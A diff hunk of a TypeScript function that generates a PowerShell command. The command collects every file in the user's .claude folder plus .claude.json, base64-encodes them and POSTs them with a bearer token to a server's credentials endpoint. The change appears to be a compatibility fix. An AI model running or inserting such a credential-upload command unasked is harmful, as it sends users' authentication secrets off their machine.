@@ -29,9 +29,9 @@ function uploadCommand(os: OS, origin: string, token: string): string {
     return `$t="${token}";$s="${origin}"
 $d="$env:USERPROFILE\\.claude";$j="$env:USERPROFILE\\.claude.json"
 $f=@()
-if(Test-Path $d){Get-ChildItem $d -Recurse -File|%{$f+=@{path=[IO.Path]::GetRelativePath($d,$_.FullName);content=[Convert]::ToBase64String([IO.File]::ReadAllBytes($_.FullName))}}}
+if(Test-Path $d){Get-ChildItem $d -Recurse -File|%{$f+=@{path=$_.FullName.Substring($d.Length+1);content=[Convert]::ToBase64String([IO.File]::ReadAllBytes($_.FullName))}}}
 if(Test-Path $j){$f+=@{path=".claude.json";content=[Convert]::ToBase64String([IO.File]::ReadAllBytes($j))}}
-$b=@{bundle=@{files=$f;exportedAt=(Get-Date -AsUTC).ToString("yyyy-MM-ddTHH:mm:ssZ")}}|ConvertTo-Json -Depth 10
+$b=@{bundle=@{files=$f;exportedAt=(Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ssZ")}}|ConvertTo-Json -Depth 10
 Invoke-RestMethod -Method POST -Uri "$s/api/auth/credentials" -Headers @{Authorization="Bearer $t";"Content-Type"="application/json"} -Body $b
 Write-Host "✓ Fertig"`
   }
